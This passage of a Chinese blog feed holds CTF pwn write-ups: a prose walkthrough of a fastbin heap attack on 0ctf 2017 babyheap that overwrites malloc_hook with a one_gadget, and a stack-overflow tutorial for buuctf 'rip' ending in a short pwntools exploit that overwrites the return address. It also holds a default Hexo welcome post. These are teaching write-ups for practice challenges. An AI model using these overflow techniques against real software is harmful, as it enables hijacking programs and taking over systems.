title="2.一点点基础知识"></a>2.一点点基础知识</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点</p><p>如果你学到堆题，却连chunk的数据结构都不清楚，我个人也不是很推荐你继续埋头刷题了。</p><p>然后有些人可能不知道去哪里学习这些堆的基础内容，我个人的建议是ctfwiki有一个较为完整的框架，可以去看看，但观感就像老师纯念ppt一样，堆一些新手可能不是很友好，所以b站直接搜pwn其实也有不少讲的还行的培训，两者搭配起来，只论底层原理的话感觉也不算很难，应该很容易就可以搞定了。</p><p>不过最近刚好在看glibc内存管理，手上刚好有个图，发出来给大伙儿看看，侵删，大概是这样，我就不做多的讲解了，细节性的东西自己去研究吧。</p><p><img src="/2021/09/21/babyheap-0ctf-2017-wp/1.png" alt="1"></p><p><img src="/2021/09/21/babyheap-0ctf-2017-wp/2.png" alt="2"></p><p>chunk大概就是这样，如果没有基础看起来肯定也很复杂，但还是那句话这也不该是我在wp里慢慢告诉你的东西，然后就是ubuntu16采用的还是fastbin而不是tache，这题也是主要利用fastbin进行攻击的。这部分内容感觉内存管理这个pdf里讲的就不算特别详细了，如果不明白的就在我刚刚说的那几种学习方式去自己学吧。</p><p>ida的逆向过程我不是很想放…有点懒了,别的wp应该也讲了很多了，对着看看就好。</p><h1 id="3-总体思路"><a href="#3-总体思路" class="headerlink" title="3.总体思路"></a>3.总体思路</h1><p>首先想说的是，buu的刷题路线感觉很陡峭，如果刚从栈题切换到堆题，可能会很迷茫，因为在栈题里面，我们一般就盯着ret address把他劫持了就行了…但是在堆题里，哪怕了解了chunk的结构，我们也有点无从下手，不知道该如何利用，这里先不多说，我反正当时这个想法很强烈，在题目里感悟就好</p><p>到这里，我们终于可以开始讲这题的思路了，总体思路是泄露libc基址，这样我们可以获得malloc_hook的地址，然后更改malloc_hook，把一个one_gadget放进去，这样调用malloc_hook的时候就会变成调用one_gadget从而控制程序执行流。</p><p>可能会有人去问malooc_hook是什么，我的建议是baidu or google</p><p>然后再细化一点</p><p>我们最开始在前面alloc来free去，目的其实就是为了获得指向同一个0x80堆块的两个指针，获得双指针这也是double free 与uaf的思想，个人认为也是堆题里面很重要的一个思想，为什么需要指向同一个堆块里的两个指针呢？这个的话要具体情况具体分析，比如在本题，我们需要获得libc_base从而获得malloc_hook,需要用到unsorted bin里的一个特性，当unsorted bin里只有一个chunk时，这个chunk的fd和bk指针将会指向main_arena+0x58,而main_arena又与libc_base有固定偏移，至少在ubuntu16里偏移应该是0x3c4b20。于是我们知道了固定偏移减去就可以得到libc_base，但是说起来很简单的一个事情，想要实现的关键是什么呢？那就是读取放入unsortedbin的那个chunk的bk指针，那么我们从ida的逆向分析中可以得知，被free放入各种bin中的chunk是无法被dump（打印功能）的，但是如果我们此时拥有一个双指针，一个指针被free了，但是另外一个并没有，对于这个指针来说，他就可以直接把fd指针dump出来。</p><p>然后这题获得指向0x80的两个指针的方法是什么呢？我们alloc(0x10)四次，依次为chunk 0 1 2 3 然后alloc(0x80)，为chunk 4，然后这个时候我们把1和2free了，1和2free以后会进入fastbin，至于为什么要扔进fastbin，因为相较于其他bin单链表结构会很方便处理，也没有unlink检测什么的，然后我们通过修改chunk 2的fd指向chunk 4，如何修改chunk 2呢，被free的chunk也是不能用fill修改的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！但是我们的fill函数是没有越界检查的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！这也是本题最大的漏洞，于是我们就fill(0,payload)从chunk0一点点溢出到chunk2并且改了他的fd（至于payload的构成和chunk数据结构有关，在此不多赘述，可以自己用gdb调一调），并且fastbin也是有检测的，我们需要将chunk4的size位改小，因为fastbin是有限制的，所以就有了fill（3，payload）这一步，这里我们改的是0x21，然后fastbin是和堆一样先进后出的，所以后进的chunk2会被第一个调用，然后会去看chunk2的fd指针，就等于把chunk 4 也放进了fastbin，于是这个时候我们再alloc两次，第一次把chunk2放在了chunk1的位置，第二次把chunk4放在了chunk2的位置，于是这个时候我们的chunk2和chunk4都指向了chunk4，这里我们需要注意总结的是什么呢，我们的chunk4是从来没有被真正放入fastbin中的，只是fastbin以为里面chunk4进去了，所以才会造成这样的后果，简单来说就是我们做了这么多都是在欺骗fastbin。那么这个时候我们再把chunk4free掉，chunk4就被扔进unsortedbin（如果不知道啥时候进什么bin也是要自己去学学的）然后这个时候chunk4的指针已经不能dump了，但我们还有chunk2的指针，于是我们通过dump（2）并且稍微处理下数据并接收，顺利获得main_arena，下面也就顺利获得了libc_base和malloc_hook</p><p>然后这个时候我们就可以开始攻击了，这里我也懒得放图了，自己可以去看看我放的两个参考博客的图文都很详细，大概构造思路就是我们来到malloc_hook-0x23的位置，因为这里附近有一个单独的7f这个数据，可以构造为我们的size位。于是我们还是老手法，通过修改fd指针，构造出一个在malloc_hook-0x23的fakechunk，然后因为隔了0x23，把内存对齐到malloc_hook处把one_gadget扔进去就行。</p><p>总结一下思路就是，扔进fastbin里然后改fd改size，从而制造出各种fakechunk来实现我们的最终目的。</p><p>最后还是想说因为我懒并且觉得也没啥人看我博客，所以我就纯当自己梳理思路了，真正想看懂这题肯定还是离不开我开头的两篇参考博客。也不要说我毫无作用吧，至少我帮你们在一堆看不懂的wp里面找了两个稍微能看懂的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt; 前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博客，思路其实是一样的，payload稍微有点偏差，大家可以去看看，说不定你们就不想看我的博客了（::&amp;gt;_&amp;lt;::），然后就是这样吧，还是想强调一下本文多文字思路，几乎无图。因为懒，所以想要真正看懂这题还是要去多看看我下面放的这两个参考博客吧。&lt;/p&gt;
&lt;p&gt;也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。&lt;/p&gt;
&lt;p&gt;总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。&lt;/p&gt;
&lt;p&gt;参考博客1：&lt;a href=&quot;http://pearcechn.top/2021/02/02/[writeup]buuctf-pwnheap_1/&quot;&gt;http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考博客2：&lt;a href=&quot;https://blog.csdn.net/xieyichensss/article/details/116071092&quot;&gt;https://blog.csdn.net/xieyichensss/article/details/116071092&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特别提醒，源码里面的‘与“不知道为什么复制粘贴过来就变成奇怪的格式，所以除非你愿意一个个改’与”，不建议使用本文源码，上面博客的源码与本文思路相同，可以参考&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn buuctf rip 简单栈溢出 详细wp</title>
    <link href="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/"/>
    <id>http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/</id>
    <published>2021-07-11T19:53:18.000Z</published>
    <updated>2021-10-22T09:50:52.086Z</updated>
    
    <content type="html"><![CDATA[<p>buu上rip这道题作为pwn里面最简单的栈题，意外的发现网上很多wp因为远程环境的更新，需要维持堆栈平衡，所以原先老旧的wp在本地可以打通，但在远程却打不通，甚至很多人的blog就拿着原本可以打通的wp贴上去，自己都没有实操一遍，我相信很多人都和我一样因为这些wp对初期学习造成了不小的困扰，特别是初期自己底层知识什么都不懂的时候，看到一些甚至是在胡乱解释的wp，就不知道该如何进行后续的学习了，所以今天我通过近两天的摸索，写一篇尽量正确的wp，因为我自己水平有限，一些细节的地方可能会有错误，但大的思路一定是对的，希望能给大家提供帮助，其中用到了别人ppt里现成的图，本人仅用作学习交流，侵删。</p><span id="more"></span><p>ps：因为这里是作为本人的学习笔记，所以前面会有大量的关于栈如何工作的基础内容，不想看的可以直接跳过去看最后的wp</p><h1 id="1-Stack-栈-的工作原理"><a href="#1-Stack-栈-的工作原理" class="headerlink" title="1.Stack(栈)的工作原理"></a>1.Stack(栈)的工作原理</h1><h2 id="1-1C语言内存分布"><a href="#1-1C语言内存分布" class="headerlink" title="1.1C语言内存分布"></a>1.1C语言内存分布</h2><p>首先我们来看当一个c语言函数在执行的时候，操作系统是如何调度内存将数据存放并且完成相关函数操作的!</p><p><img src="/15.png" alt="15"></p><p>在右边的图中，我们可以大致的了解，一个c程序被编译成可执行文件执行时，他在内存中的存储情况如该图所示，这是一个内存空间，地址由底部逐渐升高，其中，最上层的kernel是操作系统的核心源码，他是操作系统完成各项功能的关键，这一部分我们暂时不做深入的研究，在早期的学习中，我们关注的是Stack(栈)，Heap(堆)，BSS(静态内存分配)。</p><p>其中Stack(栈)用于静态分配中的存放局部变量，如局部变量t和ptr都被储存在了栈中，而BSS存储全局变量，Heap则负责存储动态分配的内存空间，如c语言中的malloc/free分配内存时，就会分配到Heap区域。</p><p>而Heap与Stack中间的内存空间，则是共享的一片内存空间，Heap从低地址向高地址分配空间，Stack从高地址向低地址分配空间，从而完整高效的使用了这一片内存空间。</p><h2 id="1-2栈中的内存分布与工作原理"><a href="#1-2栈中的内存分布与工作原理" class="headerlink" title="1.2栈中的内存分布与工作原理"></a>1.2栈中的内存分布与工作原理</h2><p>好了，现在我们已经大致了解了c语言的内存分布，其中heap和Bss尤其是heap会在后面更深入的学习中使用，我也会在后续的wp中更新相关知识，今天这道题只需要用的栈的相关知识，现在我们来看，当函数调用时，栈的内存空间是如何分布的。</p><p><img src="/16.png" alt="16"></p><p>栈这个数据结构相信大家早就学过，首先我们需要了解一下栈中常用的3个寄存器,64位cpu对应rsp,rbp,rip三个寄存器。而32位cpu则对应esp，ebp，eip三个寄存器。然后我们了解一下栈帧的概念，一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间，rsp/esp永远指向栈帧的栈顶，rbp/ebp则永远指向栈帧的栈底,rip/eip指向当前栈栈帧执行的命令。如图中文字所，栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，简单来说就是在c语言的编译过程中还有很多函数如scanf等由他人的库写好的函数我们需要进行“链接”，所以main函数并不是最栈顶的函数，当然main以上的函数我们这题不需要进行研究，你也可以当做栈顶就是main函数，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数，比如，当上面的代码main函数调用到sum函数时，便会开辟一个新的栈帧，这里需要注意的是，main函数调用sum函数完成1+2时，1和2会被逆向存储在自己的栈帧（main函数的栈帧）中，然后完成sum函数以后，回到main函数继续执行剩余操作。</p><p>下面，我们来看每个栈帧的具体结构</p><p><img src="/3.png" alt="3"></p><p><img src="/9.png" alt="4"><img src="/5.png" alt="5"><img src="/6.png" alt="6"></p><p>上面的几张图，就是创建新栈帧的过程，当然，图中所演示的是在32位cpu中的情况，也是就是寄存器与存储字长有着细微的变化，但是差别并不是很大，并且，图中的对于寄存器的各种操作都是在汇编代码中具体实现的，这里我们并不赘述太多，相信大家都对简单的汇编或多或少有些了解，图中我们可以看到两个相邻的栈帧，子函数(callee’s function state)栈帧的Return Address紧挨着父函数(caller’s…state)，而我们需要注意的是，Return Address是什么呢？在第二张图中，很明确的告诉我们，在调用子函数时，我们将汇编中父函数的下一个汇编指令的地址，放入Return Address，这样我们在子函数完成时，便可以将Return Address中的值弹入rip/eip中，这样程序便会从上次调用的地方继续完成父函数，而这一点，也就是我们实行栈溢出的关键，我们不妨想一想，如果我们能够通过某种方式，操控Return Address的返回地址，那么是不是意味着，我们可以任意操控远程的机器指向任何指令，也就是说我们只要可以篡改Return Address指向一个危险函数的地址，理论上，我们就可以通过危险函数干任何我们想干的事情。那么我们再来看看当子函数调用结束后，是如何删除子函数的栈帧返回父函数的。</p><p><img src="/7.png" alt="7"></p><p>这里具体需要ppt中的汇编代码辅助理解，但是汇编代码的流程图实在太多，改天有空我会发上去，大概就是esp先等于ebp，然后再pop ebp 将esp指向的地址的值赋给ebp，也就是此时的父函数的一个栈帧的栈底，于是ebp就回到了父函数的栈底，而因为pop以后esp自动加一指向Return Address（因为栈是从高地址指向低地址，所以是加一），然后再执行return指令，简单的讲就是pop eip，将esp指向的值弹入到eip中，前面我们说过Return Address里存放的是当前栈帧函数的父函数调用当前函数时下一个指令的地址，而eip又是当前要执行的指令地址的寄存器，于是这样就会回到父函数继续执行父函数的下一个指令。而此时pop以后esp再次加一，所以就回到了父函数栈帧的栈顶，ebp也在上一次pop ebp时就回到了父函数的栈底，而这样一个过程可以理论上被无数次执行，所以用栈来实现函数调用及其的方便。</p><h1 id="2-buuctf-rip-wp"><a href="#2-buuctf-rip-wp" class="headerlink" title="2.buuctf rip wp"></a>2.buuctf rip wp</h1><h2 id="2-1栈溢出的原理"><a href="#2-1栈溢出的原理" class="headerlink" title="2.1栈溢出的原理"></a>2.1栈溢出的原理</h2><p>那么上面我们学习了栈的基础知识，我们便以buu上的这一道rip来看一下最简单的栈溢出。</p><p>如果你认真的看了上面的栈的工作流程，那么你就会发现，实际上在一个函数调用完以后就要将Return Address的值返回rip/eip，他的值也就是父函数调用此函数时下一个指令的地址，而rip/eip将执行这一指令，并继续完成父函数，那么我们只要设法将Return Address的值改变到一个危险函数的地址，我们就可以通过这个危险函数获得系统的控制权。</p><p>那么我们怎么样才可以改变Return Address的地址呢？我们知道子函数在调用时，如果子函数中有局部变量，那么他将被存储到子函数的栈帧中，以这道rip为例，下载rip给我们的elf文件，将其拖入ida pro,按f5将其反编译成c语言伪代码</p><p><img src="/10.png" alt="10"></p><p>我们可以看到，主要有一个main函数，还有一个fun函数</p><p><img src="/11.png" alt="11"></p><p>这个elf可执行文件，补充一下，elf是linux下的可执行文件，相当于windows中的exe文件，他的反编译文件是由一个main函数和一个fun函数组成的，当我们用虚拟机在unbantu中正常执行他时，他只会执行main函数，因为fun函数并没有被调用，而fun函数也就是我们上面说的危险函数，system是c语言下的一个可以执行shell命令的函数，目前你可以简单理解为，执行了这个危险函数，我们就拿到了远端服务器的shell，也就是相当于在windows下以管理员身份开启cmd，那么我们就可以通过一系列后续指令控制远端服务器，但在ctf中，我们只需要拿到shell以后获得flag就算成功。</p><p>那么，回过头来，我们再来看这个main函数，我们刚刚说过，函数的局部变量会存放在他的栈中，那么在main函数中，他char了一个s，也就是在main函数的栈帧中，划分了一个15字节的存储空间，我们在unbantu中file一下这个文件:</p><p><img src="/13.png" alt="13"></p><p>我们可以发现，这是一个64位的elf文件，也就是说，每个存储单元是8个字节（如果不知道的去学学计组），简单的讲就是一个字节是8位，因为他是64位，所以一个存储单元就是8个字节，同理32位就是4个字节。</p><p>然后我们可以先通过checksec查看保护机制(不知道没关系，以后才会用到)，因为这题是任何保护都没有打开的，所以我们可以实现最简单的栈溢出</p><p><img src="/12.png" alt="12"></p><p>接回上面的话题，我们开辟了一个15个字节的存储空间，那么在栈帧中系统就会给我们分配一个15个字节的存储空间，那么我们再注意一下我们是如何写入这15个字节的数据的，没错，我们使用的是gets函数，相信大家在c语言中都学习过这个函数，我们在c语言的学习中知道，这个函数时可以无限制输入数据的，但当时，我们并没有意识到gets函数时危险的，现在，我们通过前面栈的工作原理的学习，我们发现，我们明明只分配了15个字节的内存空间，但是我们可以输入无数个字节，那么这会导致什么问题呢？请大家自己回过头再去看一看前面栈的结构图!<img src="/6.png" alt="6"></p><p>此时，我们的s就在Local Variables，把他想象成一个水桶，我们如果可以一直往里面不停的倒水，那么这个水桶的水满了，是不是就可以溢出到另一个水桶Caller’s ebp里？再继续倒水，那是不是就溢出到了Return Address里，那么原本不属于Return Address的水由于其他水桶的溢出而进入了Return Address，也就是改变了Return Address的值。这个时候，我们前面所说的，通过改变Return Address的值来完成对危险函数的调用，是不是就可以实现了？</p><p>那么，最后的问题就是，我们该怎么确定溢出多少水呢？这个也是很简单的问题，Local Variables也就是char s[]划定了15个字节的内存空间,那么我们需要知道这个内存空间在栈中的位置，就可以知道需要多少个字节才能到达<img src="/14.png" alt="14"></p><p>我们打开ida pro ，作为最简单的栈题，ida pro 已经清晰的告诉了我们距离rbp的距离是Fh,这是16进制也就是15个字节，当然，这只是理想的情况，在复杂一些的情况中，开辟的内存地址显然不会像这题一样紧挨着上一个rbp，甚至有时出题人会故意在ida的静态调试中告诉你错误的地址，这个时候你需要用pwndbg进行动态调试，这题通过动态调试也可以发现，二者的地址是一样的。所以我们首先需要输入15个字节到达rbp的位置。</p><p>然后Caller’s ebp中存储的是上一个函数的ebp的值，当然，我们这个图的例子是32位的系统，而我们是64位的系统，所以ebp应该是rbp才对，是8个字节，那么我们还需要8个自己的数据把Caller’s rbp的数据填满（当然在本题中应该是rbp,因为是64位的系统),这样我们就填满了前两个水桶，你可以理解为水即将溢出进入Return Address了，所以接下来我们输入的值，将溢出进入Return Address,也就是说，这时我们还需要输入危险函数，也就是fun函数的地址，查看一下ida pro发现fun函数的地址是0x401186，于是只需要再输入0x401186这一地址值，该地址就被我们送到了Return Address，当这个函数调用结束后就会被送到rip，执行fun函数，从而控制shell。</p><h2 id="2-2exp"><a href="#2-2exp" class="headerlink" title="2.2exp"></a>2.2exp</h2><p>from pwn import <em><br>p = remote(“node4.buuoj.cn”,27296)<br>payload=b’A’</em>15+b’B’*8+p64(0x401186+1)<br>p.sendline(payload)<br>p.interactive()</p><p>作为最简单的pwn题，当然是最简单的exp，只要知道原理几行代码就可以搞定，我们发送了15个A用来填充s，再发送8个字节用来填充b，将地址打包位p64位的数据一起发送，就可以完成栈溢出，至于最后为什么要+1，我们可以发现，不加一我们在本地可以打通，但是却打不通远程，这也是我开头说的，和以前payload不一样的地方，原理我们是没有错的，这里+1是为了堆栈平衡，详细可以看大佬的博客<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p><p>因为现在已经是凌晨三点，再加上我对这里还有点模糊，也就不废话了，总之我们学的知识是没有错的，这里需要堆栈平衡应该也是远程buu的服务器更新以后linux环境发生了变化，加了新的要求，而不是因为其他原因，改成15个字节直接发送地址不加一也可以完成交互，但是并不是因为不需要覆盖rbp，而是满足堆栈平衡的一种另外一种方式，后续如果学明白了会更新。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然是最简单的pwn题，exp只有短短几行代码，但是想要完全掌握背后的知识，却不是那么简单，哪怕是已经学了两天，今天在复盘栈的工作原理的时候，发现自己也会很多不熟练的地方，所以只有将基础打牢，能在脑海中自动演示栈的工作原理，才能完成后续更加复杂的学习，这也是二进制安全难入门的地方之一，在此与各位师傅共勉。</p><p>这里面用的图，全都是某个安全团队大师傅讲pwn入门公开课用的图，因为一些问题不太方便公开，如果有人需要完整ppt的话，后续会放一些联系方式，如果有疑问或者想要ppt再或者想要一起学习的师傅可以在后续的联系方式中私信联系我（信息安全意识）。</p><p>那么就是这样，写完已经凌晨三点了，还是那句话，很简单的题目，但很多厉害的大牛都懒得详细写这些，可能我第一次写博客写的也不是很好，但希望对各位能有所帮助，就是这样，睡觉了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu上rip这道题作为pwn里面最简单的栈题，意外的发现网上很多wp因为远程环境的更新，需要维持堆栈平衡，所以原先老旧的wp在本地可以打通，但在远程却打不通，甚至很多人的blog就拿着原本可以打通的wp贴上去，自己都没有实操一遍，我相信很多人都和我一样因为这些wp对初期学习造成了不小的困扰，特别是初期自己底层知识什么都不懂的时候，看到一些甚至是在胡乱解释的wp，就不知道该如何进行后续的学习了，所以今天我通过近两天的摸索，写一篇尽量正确的wp，因为我自己水平有限，一些细节的地方可能会有错误，但大的思路一定是对的，希望能给大家提供帮助，其中用到了别人ppt里现成的图，本人仅用作学习交流，侵删。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/07/09/hello-world/"/>
    <id>http://example.com/2021/07/09/hello-world/</id>
    <published>2021-07-09T08:06:37.518Z</published>
    <updated>2021-10-22T09:50:52.084Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
